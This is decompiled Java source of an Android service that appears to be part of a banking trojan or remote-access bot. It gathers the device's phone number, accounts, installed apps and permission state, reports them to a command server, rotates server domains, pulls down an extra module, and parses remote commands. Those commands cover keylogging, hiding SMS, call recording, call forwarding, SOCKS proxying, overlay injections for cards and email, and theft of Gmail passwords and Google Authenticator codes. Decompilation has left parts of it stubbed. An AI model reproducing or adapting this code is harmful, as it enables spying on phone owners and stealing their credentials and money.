package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import java.util.Locale;
import org.json.JSONObject;

public class srvNetworkConnect extends IntentService {
   utils elephant$ = new utils();
   constants builds$ = new constants();

   public srvNetworkConnect() {
      super("");
   }

   private String decrypt_str(String var1) {
      var1 = "YmM=";
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   private void a(Context var1) {
      StringBuilder var5 = new StringBuilder();
      var5.append(srvNetworkConnect.class.getSimpleName());
      var5.append("   ");
      String var7 = var5.toString();
      constants var8 = new constants();
      String var9 = this.elephant$.SettingsRead(var1, "QQ");
      TelephonyManager var10 = (TelephonyManager)this.getBaseContext().getSystemService("phone");
      String var6 = this.elephant$.SettingsRead(var1, "AL");
      JSONObject var11 = new JSONObject();
      boolean var2 = true;
      var11.put("DM", var6);
      var11.put("AD", "null");
      var11.put("BL", utils.getBatteryLevel(var1));
      var11.put("TW", this.elephant$.SettingsRead(var1, "AK"));
      String var12 = "SA";
      String var17;
      if (utils._exercise(this)) {
         var17 = "YmQ=";
      } else {
         var17 = "YmM=";
      }

      var17 = this.decrypt_str(var17);
      var11.put(var12, var17);
      var11.put("SP", this.elephant$.SettingsRead(var1, "SR"));
      var11.put("SS", utils._janet(var1));
      var17 = "LE";
      StringBuilder var30 = new StringBuilder();
      var30.append(Locale.getDefault().getLanguage());
      var11.put(var17, var30.toString());
      var12 = "SY";
      if (utils.isAccessibilityServiceEnabled(var1, srvAccessibility.class)) {
         var17 = "YmQ=";
      } else {
         var17 = "YmM=";
      }

      var17 = this.decrypt_str(var17);
      var11.put(var12, var17);
      var11.put("SM", utils._delhi(this));
      var11.put("ID", var9);
      var11.put("IS", this.elephant$.SettingsRead(var1, "AG"));
      var12 = "NR";
      if (var1.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
         var17 = ((TelephonyManager)var1.getSystemService("phone")).getLine1Number();
      } else {
         var17 = "";
      }

      var11.put(var12, var17);
      var11.put("GA", utils.getAccounts(this));
      var11.put("PS", utils.hasPermission(this, var8.pentium$[0]));
      var11.put("PC", utils.hasPermission(this, var8.pentium$[1]));
      var11.put("PP", utils.hasPermission(this, var8.pentium$[2]));
      var11.put("PO", utils.hasPermission(this, var8.pentium$[3]));
      utils var21 = this.elephant$;
      var30 = new StringBuilder();
      var30.append("jsonCheckBot: ");
      var30.append(var11.toString());
      var21.Log(var7, var30.toString());
      var21 = this.elephant$;
      var30 = new StringBuilder();
      var30.append("q=info_device&ws=");
      var30.append(this.elephant$._grown(var11.toString()));
      var17 = var21._brought(this, var30.toString());
      utils var27 = this.elephant$;
      var30 = new StringBuilder();
      var30.append("jsonCheckBot: ");
      var30.append(var17);
      var27.Log(var7, var30.toString());
      StringBuilder var14;
      int var16;
      String var28;
      utils var34;
      if (var17 == null || var17.length() < 2 || var17.contains("503 Service Unavailable")) {
         label260: {
            var28 = this.elephant$.SettingsRead(var1, "SB");
            if (var28.contains(",")) {
               String[] var33 = var28.replace(" ", "").split(",");
               int var3 = var33.length;

               for(var16 = 0; var16 < var3; ++var16) {
                  var28 = var33[var16];
                  if (var28.length() > 5) {
                     utils var13 = this.elephant$;
                     var14 = new StringBuilder();
                     var14.append("Check URL: ");
                     var14.append(var28);
                     var13.Log(var7, var14.toString());
                     if (this.elephant$._center(var28).contains("200")) {
                        this.elephant$.SettingsWrite(var1, "QE", var28);
                        var34 = this.elephant$;
                        StringBuilder var31 = new StringBuilder();
                        var31.append("NEW DOMAIN: ");
                        var31.append(var28);
                        var34.Log(var7, var31.toString());
                        var2 = true;
                        break label260;
                     }
                  }
               }
            }

            var2 = false;
         }
      }

      if (utils.checkNetworkConnection(this)) {
         var28 = this.elephant$._basin();
         var34 = this.elephant$;
         String var32 = "**GET_NEW_URL***";
         var14 = new StringBuilder();
         var14.append("url: ");
         var14.append(var28);
         var34.Log(var32, var14.toString());
         if (!var28.isEmpty()) {
            this.elephant$.SettingsWrite(this, "QE", var28);
         }
      }

      var27 = this.elephant$;
      var30 = new StringBuilder();
      var30.append("EnCryptResponce: ");
      var30.append(var17);
      var27.Log(var7, var30.toString());
      var17 = this.elephant$._marina(var17);
      var27 = this.elephant$;
      var30 = new StringBuilder();
      var30.append("CheckBotRESPONCE: ");
      var30.append(var17);
      var27.Log(var7, var30.toString());
      Object var10001;
      String var10003;
      StringBuilder var20;
      JSONObject var24;
      if (var17.contains("get_new_patch") && !var6.equals("1")) {
         utils var15 = this.elephant$;
         var24 = new JSONObject();
         var24.put("ID", var9);
         var20 = new StringBuilder();
         var20.append("q=upgrade_n_patch&ws=");
         var20.append(var15._grown(var24.toString()));
         var17 = var15._marina(var15._brought(this, var20.toString()));
         var20 = new StringBuilder("Download Module: ");
         var20.append(var17.length());
         var15.Log("downloadModuleDex", var20.toString());
         if (var17.length() > 10000) {
            var15.Log("downloadModuleDex", "Save Module");
            byte[] var35 = Base64.decode(var17.getBytes(), 0);
            var10001 = null;
            var10003 = null;
            this.getDir("apk", 0);
            String var10005 = "ring0.apk";
            boolean var36 = true;
            var6 = null;
            var15.SettingsWrite(this, "AL", "1");
            System.gc();
         }

      } else {
         utils var18;
         StringBuilder var22;
         if (var17.equals("no_device")) {
            var11 = new JSONObject();
            var6 = utils.countrySIM(var1);
            var17 = var6;
            if (var6.length() != 2) {
               var17 = Locale.getDefault().getCountry().toLowerCase();
            }

            var11.put("ID", var9);
            var11.put("AR", VERSION.RELEASE);
            var11.put("TT", "gÃ¼ncelleme11");
            var11.put("CY", var17);
            var11.put("OP", var10.getNetworkOperatorName());
            var9 = "MD";
            String var29 = Build.MANUFACTURER;
            var6 = Build.MODEL;
            var17 = var6;
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) {
               var16 = utils.getMiuiVersion();
               var17 = var6;
               if (var16 != 0) {
                  var5 = new StringBuilder();
                  var5.append(var6);
                  var5.append(" MIUI V");
                  var5.append(var16);
                  var17 = var5.toString();
               }
            }

            if (var17.toLowerCase().startsWith(var29.toLowerCase())) {
               var17 = utils._premises(var17);
            } else {
               var20 = new StringBuilder();
               var20.append(utils._premises(var29));
               var20.append(" ");
               var20.append(var17);
               var17 = var20.toString();
            }

            var11.put(var9, var17);
            var21 = this.elephant$;
            var20 = new StringBuilder();
            var20.append("jsonRegistrationBot: ");
            var20.append(var11.toString());
            var21.Log(var7, var20.toString());
            var21 = this.elephant$;
            var18 = this.elephant$;
            var22 = new StringBuilder();
            var22.append("q=new_device&ws=");
            var22.append(this.elephant$._grown(var11.toString()));
            var17 = var21._marina(var18._brought(this, var22.toString()));
            var17.equals("no_reg");
            var18 = this.elephant$;
            var22 = new StringBuilder();
            var22.append("RegistrationRESPONCE: ");
            var22.append(var17);
            var18.Log(var7, var22.toString());
            if (var17.equals("ok")) {
               this.elephant$.SettingsWrite(var1, "QI", "1");
            }

         } else if (var17.length() > 4) {
            var24 = new JSONObject(var17);
            StringBuilder var23;
            if (var24.getString("this").equals("device_no_cmd") && this.elephant$.SettingsRead(var1, "QI").equals("1")) {
               var24 = new JSONObject();
               this.elephant$.Log(var7, "this device_no_cmd start!");
               var24.put("ID", var9);
               var24.put("AP", this.elephant$.getInstalledApps(var1));
               var18 = this.elephant$;
               var22 = new StringBuilder();
               var22.append("jsonUpdateInj: ");
               var22.append(var24.toString());
               var18.Log(var7, var22.toString());
               var18 = this.elephant$;
               var22 = new StringBuilder();
               var22.append("q=is_attacker&ws=");
               var22.append(this.elephant$._grown(var24.toString()));
               var17 = var18._brought(var1, var22.toString());
               var17 = this.elephant$._marina(var17);
               var18 = this.elephant$;
               var22 = new StringBuilder();
               var22.append("RESPONCE: ");
               var22.append(var17);
               var18.Log(var7, var22.toString());
               if (!var17.equals("device_null#")) {
                  boolean var4 = var17.isEmpty();
                  if (!var4) {
                     String[] var19 = var17.split(":");

                     for(var16 = 0; var16 < var19.length; ++var16) {
                        if (!var19[var16].isEmpty()) {
                           this.elephant$.SettingsWrite(var1, var19[var16], "");
                           utils var26 = this.elephant$;
                           var23 = new StringBuilder();
                           var23.append("icon_");
                           var23.append(var19[var16]);
                           var26.SettingsWrite(var1, var23.toString(), "");
                           var26 = this.elephant$;
                           var23 = new StringBuilder();
                           var23.append("Initialization Injection: ");
                           var23.append(var19[var16]);
                           var26.Log(var7, var23.toString());
                        }
                     }

                     this.elephant$.SettingsWrite(var1, "QU", var17);
                     this.elephant$.SettingsWrite(var1, "QI", "");
                     this.elephant$.SettingsWrite(var1, "QO", "1");
                     this.elephant$.Log(var7, "Save Array Injections");
                     return;
                  }
               }

            } else {
               if (var24.getString("this").equals("global_settings#")) {
                  this.elephant$.Log(var7, "global_settings#");
                  this.elephant$.SettingsWrite(var1, "AG", var24.getString("id_settings"));
                  if (var24.getString("urls").length() > 7) {
                     var18 = this.elephant$;
                     var9 = "SB";
                     var23 = new StringBuilder();
                     var23.append(this.elephant$.SettingsRead(var1, "QE"));
                     var23.append(",");
                     var23.append(var24.getString("urls"));
                     var18.SettingsWrite(var1, var9, var23.toString());
                  }

                  if (this.elephant$.SettingsRead(var1, "AV").equals("-1")) {
                     this.elephant$.Log(var7, "Save injection_t");
                     this.elephant$.SettingsWrite(var1, "AV", var24.getString("injection_t"));
                  }

                  if (this.elephant$.SettingsRead(var1, "AB").equals("-1")) {
                     this.elephant$.Log(var7, "Save cards_t");
                     this.elephant$.SettingsWrite(var1, "AB", var24.getString("cards_t"));
                  }

                  if (this.elephant$.SettingsRead(var1, "AN").equals("-1")) {
                     this.elephant$.Log(var7, "Save emails_t");
                     this.elephant$.SettingsWrite(var1, "AN", var24.getString("emails_t"));
                  }

                  if (this.elephant$.SettingsRead(var1, "SU").equals("-1")) {
                     this.elephant$.Log(var7, "Save admin_t");
                     this.elephant$.SettingsWrite(var1, "SU", var24.getString("admin_t"));
                  }

                  if (this.elephant$.SettingsRead(var1, "SI").equals("-1")) {
                     this.elephant$.Log(var7, "Save permission_t");
                     this.elephant$.SettingsWrite(var1, "SI", var24.getString("permission_t"));
                  }

                  if (this.elephant$.SettingsRead(var1, "SY").equals("-1")) {
                     this.elephant$.Log(var7, "Save protect_t");
                     this.elephant$.SettingsWrite(var1, "SY", var24.getString("protect_t"));
                     return;
                  }
               } else {
                  if (var24.getString("this").equals("device_settings#")) {
                     this.elephant$.Log(var7, "get device_settings#");
                     this.elephant$.SettingsWrite(var1, "AF", var24.getString("hideSMS"));
                     this.elephant$.SettingsWrite(var1, "AZ", var24.getString("lockDevice"));
                     this.elephant$.SettingsWrite(var1, "AX", var24.getString("offSound"));
                     this.elephant$.SettingsWrite(var1, "AC", var24.getString("keylogger"));
                     this.elephant$.SettingsWrite(var1, "QP", var24.getString("activeInjection"));
                     this.elephant$.SettingsWrite(var1, "ES", var24.getString("endless_start"));
                     this.elephant$.SettingsWrite(var1, "WR", var24.getString("record_call"));
                     return;
                  }

                  if (var24.getString("this").equals("run_cmd")) {
                     label221: {
                        var18 = this.elephant$;
                        var22 = new StringBuilder();
                        var22.append("get run_cmd: ");
                        var22.append(var24.toString());
                        var18.Log(var7, var22.toString());
                        JSONObject var25 = new JSONObject(new String(Base64.decode(var24.getString("data"), 0), "UTF-8"));
                        var17 = var25.getString("cmd");
                        switch(var17.hashCode()) {
                        case -2033081134:
                           if (var17.equals("grabbing_lockpattern")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -1787784292:
                           if (var17.equals("run_record_audio")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -1699446502:
                           if (var17.equals("run_socks5")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -1636193849:
                           if (var17.equals("update_inject")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -1138004029:
                           if (var17.equals("stop_socks5")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -772676912:
                           if (var17.equals("rat_connect")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -634359797:
                           if (var17.equals("change_url_connect")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -561690241:
                           if (var17.equals("request_permission")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -513200628:
                           if (var17.equals("clean_cache")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -503110523:
                           if (var17.equals("change_url_recover")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -406891602:
                           if (var17.equals("send_mailing_sms")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -272565638:
                           if (var17.equals("run_admin_device")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case -203367091:
                           if (var17.equals("access_notifications")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 116079:
                           if (var17.equals("url")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 3599727:
                           if (var17.equals("ussd")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 125587325:
                           if (var17.equals("sms_mailing_phonebook")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 151232379:
                           if (var17.equals("get_data_logs")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 226593590:
                           if (var17.equals("get_all_permission")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 320759922:
                           if (var17.equals("grabbing_google_authenticator2")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 595233003:
                           if (var17.equals("notification")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 905006723:
                           if (var17.equals("grabbing_pass_gmail")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 1098891238:
                           if (var17.equals("remove_app")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 1098892172:
                           if (var17.equals("remove_bot")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 1247787042:
                           if (var17.equals("send_sms")) {
                              var2 = false;
                              break label221;
                           }
                           break;
                        case 1550329453:
                           if (var17.equals("run_app")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 1684567524:
                           if (var17.equals("call_forward")) {
                              var2 = true;
                              break label221;
                           }
                           break;
                        case 1929950368:
                           if (var17.equals("patch_update")) {
                              var2 = true;
                              break label221;
                           }
                        }

                        var2 = true;
                     }

                     this.elephant$.SettingsWrite(var1, "AL", "0");
                     var10001 = null;
                     var1.getDir("apk", 0);
                     var10003 = "ring0.apk";
                     boolean var10000 = false;
                     return;
                  }
               }

            }
         }
      }
   }

   protected void onHandleIntent(Intent var1) {
      (new Thread(new srvNetworkConnect$Thread(this))).start();
      this.a(this);
      this.stopSelf();
   }
}
